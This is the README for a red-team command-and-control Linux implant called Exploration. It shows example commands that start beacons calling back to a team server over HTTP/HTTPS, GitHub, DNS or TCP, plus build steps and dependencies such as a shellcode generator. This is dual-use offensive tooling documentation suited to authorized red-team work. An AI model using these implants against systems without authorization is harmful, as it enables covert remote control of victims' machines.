# Exploration C2 Linux Implant

## What it is

Exploration is a redteam Command and Control framework.  
This repository contain the Beacon in C++ to target linux.  
The TeamServer and Client can be found in [C2TeamServer](https://github.com/maxDcb/C2TeamServer).  

This project contains multiple beacon communicating with the TeamServer thought different means, here is some example:

```
# HTTP/HTTPS
BeaconHttp IP_TEAMSERVER PORT_LISTENER http/https
BeaconHttp 10.10.10.10 8443 https
BeaconHttp 10.10.10.10 8080 http

# Github
BeaconGithub user/project TOKEN
BeaconGithub maxDcb/C2Implant ghp_dsfgdfhdf5554456g4fdg465...

# Dns
BeaconDns DNS_SERVER DOM_TEAMSERVER
BeaconDns 8.8.8.8 bac.superdomain.com

# Tcp
BeaconTcp IP_LISTENER PORT_LISTENER
BeaconTcp 127.0.0.1 4444
```

## Build 

### Sumbodule & External Projects:  

* [Donut](https://github.com/TheWover/donut): Creat shellcode from PE files.  
* [CoffLoader](https://github.com/trustedsec/COFFLoader): Run object files from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
* [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): base64.
* [json](https://github.com/nlohmann/json): json parser.

### Build the Linux Beacons and Modules

git submodule update --init   
mkdir build  
cd build


```
# With tests and logs  
cmake .. -DCMAKE_PROJECT_TOP_LEVEL_INCLUDES=./conan_provider.cmake -DWITH_TESTS=ON
# Without tests and logs  
cmake .. -DCMAKE_PROJECT_TOP_LEVEL_INCLUDES=./conan_provider.cmake -DWITH_TESTS=OFF
make -j4
```

#### Production

Beacons are in: "Release\Beacons"  
Modules DLL in: "Release\Modules"   




